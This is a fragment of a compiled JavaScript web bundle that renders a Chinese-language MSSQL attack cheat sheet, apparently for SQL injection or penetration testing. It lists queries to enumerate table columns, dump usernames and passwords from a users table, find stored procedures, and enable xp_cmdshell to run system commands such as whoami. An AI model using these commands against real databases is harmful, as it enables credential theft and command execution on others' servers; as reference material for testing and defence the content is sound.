\u6216\u8005\uff0c\u4ee5\u4e0b\u4e0d\u652f\u6301\u8de8\u5e93\u67e5\u8be2",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select top 1 col_name(object_id('users'),1) from sysobjects;"}),(0,n.jsx)("br",{}),"-- i \u4e3a\u7b2c\u51e0\u4e2a\u5b57\u6bb5\uff0cint\u578b",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select top 1 col_name(object_id('users'),i) from sysobjects;"})]})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"\u83b7\u53d6\u503c"}),(0,n.jsx)(s.td,{style:{textAlign:"left"},children:(0,n.jsx)(s.code,{children:"select username, password from users;"})})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"\u67e5\u627e\u5b58\u50a8\u8fc7\u7a0b"}),(0,n.jsx)(s.td,{style:{textAlign:"left"},children:(0,n.jsx)(s.code,{children:"select * from master..sysobjects where name like 'sp%' order by name desc"})})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"\u5224\u65adXP_CMDSHELL\u662f\u5426\u5b58\u5728"}),(0,n.jsx)(s.td,{style:{textAlign:"left"},children:(0,n.jsx)(s.code,{children:"(select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell')"})})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"\u6267\u884c\u7cfb\u7edf\u547d\u4ee4"}),(0,n.jsxs)(s.td,{style:{textAlign:"left"},children:["-- \u5f00\u542fxp_cmdshell\u6269\u5c55\u5b58\u50a8\u8fc7\u7a0b",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"use master;"}),(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"exec sp_configure 'show advanced options',1;"}),(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"reconfigure;"}),(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"exec sp_configure 'xp_cmdshell',1;"}),(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"reconfigure;"}),(0,n.jsx)("br",{}),"-- \u6267\u884c\u7cfb\u7edf\u547d\u4ee4",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"use master;"}),(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:'exec master..xp_cmdshell "whoami";'})]})]})]})]})]})}function j(e={}){const{wrapper:s}={...(0,t.R)(),...e.components};return s?(0,n.jsx)(s,{...e,children:(0,n.jsx)(h,{...e})}):h(e)}}}]);